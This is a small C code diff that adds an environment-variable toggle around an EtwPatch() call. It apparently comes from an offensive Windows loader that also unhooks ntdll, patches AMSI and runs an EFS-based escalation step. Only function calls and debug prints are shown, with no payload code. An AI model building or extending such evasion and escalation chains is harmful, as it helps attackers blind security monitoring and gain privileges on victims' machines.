@@ -315,7 +315,12 @@ int main(void) {
             DBG("unhook_Ntdll SKIPPED via CP_SKIP_UNHOOK");
         }
         DBG(">> EtwPatch");
-        EtwPatch();
+        if (getenv("CP_SKIP_ETW") == NULL) {
+            EtwPatch();
+            DBG("EtwPatch returned");
+        } else {
+            DBG("EtwPatch SKIPPED via CP_SKIP_ETW");
+        }
         DBG(">> AmsiPatch");
         AmsiPatch();
         DBG(">> efs_escalate");
